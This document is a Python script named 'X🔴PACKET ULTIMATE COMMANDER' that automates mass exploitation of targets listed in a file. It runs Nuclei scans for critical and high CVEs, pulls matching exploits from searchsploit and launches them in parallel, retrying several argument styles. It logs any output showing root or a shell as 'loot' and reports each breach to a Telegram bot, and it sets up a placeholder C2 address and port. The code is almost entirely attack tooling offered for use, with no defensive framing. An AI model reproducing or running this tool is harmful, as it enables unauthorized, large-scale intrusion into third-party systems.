#!/usr/bin/env python3
import subprocess, os, sys, re, time, uuid, requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

# --- X🔴PACKET™ ULTIMATE COMMAND CONFIG ---
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
C2_IP = "YOUR_KALI_IP"
C2_PORT = "4444"
MAX_THREADS = 15
LOOT_VAULT = "missions/final_loot_vault"
os.makedirs(LOOT_VAULT, exist_ok=True)

def send_alert(msg):
    """ Telegram Notification Logic """
    if TELEGRAM_TOKEN != "YOUR_BOT_TOKEN":
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🎯 XPACKET_CMD:\n{msg}"})
        except: pass

class XPacketCommander:
    def __init__(self):
        self.session_id = f"XP-CMD-{os.urandom(2).hex().upper()}"

    def strike_target(self, task):
        cve_id, target_url = task
        strike_id = str(uuid.uuid4())[:6].upper()
        print(f"{Fore.RED}[🔥] STRIKE {strike_id} ENGAGED: {target_url} ({cve_id})")

        # 1. Search for Weapon
        exploit_info = subprocess.getoutput(f"searchsploit {cve_id} -m python --p")
        if ".py" in exploit_info:
            exploit_path = exploit_info.strip()
            
            # 2. Try Multiple Argument Styles (Reliability Patch)
            flags = ["--target", "-t", "--url", ""]
            for flag in flags:
                try:
                    cmd = ["python3", exploit_path, flag, target_url] if flag else ["python3", exploit_path, target_url]
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    
                    # 3. Success Validation (Real-Action Logic)
                    if proc.returncode == 0 or any(x in proc.stdout.lower() for x in ["root", "shell", "uid=0"]):
                        print(f"{Fore.GREEN}[🏁] BREACH SUCCESS ON {target_url}!")
                        send_alert(f"✅ BREACH SUCCESS!\nTarget: {target_url}\nCVE: {cve_id}")
                        self.save_loot(target_url, cve_id, proc.stdout)
                        return
                except: continue
        else:
            print(f"{Fore.BLUE}[-] No auto-weapon for {cve_id}.")

    def save_loot(self, target, cve, output):
        """ Loot Archiving Logic """
        target_name = target.replace('http://', '').replace('https://', '').replace('/', '_')
        with open(f"{LOOT_VAULT}/{target_name}.loot", "a") as f:
            f.write(f"\n--- BREECH CONFIRMED: {time.ctime()} ---\nCVE: {cve}\nLOGS: {output[:500]}\n")

    def run(self, target_file):
        os.system('clear')
        print(f"{Fore.RED}{Style.BRIGHT}X🔴PACKET™ ULTIMATE COMMANDER v400.0 (FINAL)")
        print(Fore.RED + "█" * 65)
        print(f"{Fore.WHITE}SESSION: {self.session_id} | STATUS: {Fore.GREEN}ARMED {Fore.WHITE}| ENGINE: {Fore.YELLOW}OMNI-HYBRID")
        print(Fore.RED + "█" * 65)

        while True:
            print(f"\n{Fore.CYAN}[*] Starting Recon Cycle via Nuclei...")
            try:
                # Real-time parsing from Nuclei
                cmd = f"nuclei -l {target_file} -severity critical,high -silent"
                recon_data = subprocess.check_output(cmd.split(), text=True)
                
                tasks = []
                for line in recon_data.splitlines():
                    cve_match = re.search(r"CVE-\d{4}-\d+", line)
                    if cve_match:
                        tasks.append((cve_match.group(), line.split()[-1]))

                if tasks:
                    print(f"{Fore.RED}[⚡] MASS STRIKE INITIATED ON {len(tasks)} TARGETS...")
                    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                        executor.map(self.strike_target, tasks)
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Cycle idle: No vulnerabilities found.")

            time.sleep(30)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        commander = XPacketCommander()
        commander.run(sys.argv[1])
    else:
        print(f"{Fore.YELLOW}Usage: python3 xpacket_commander.py targets.txt")
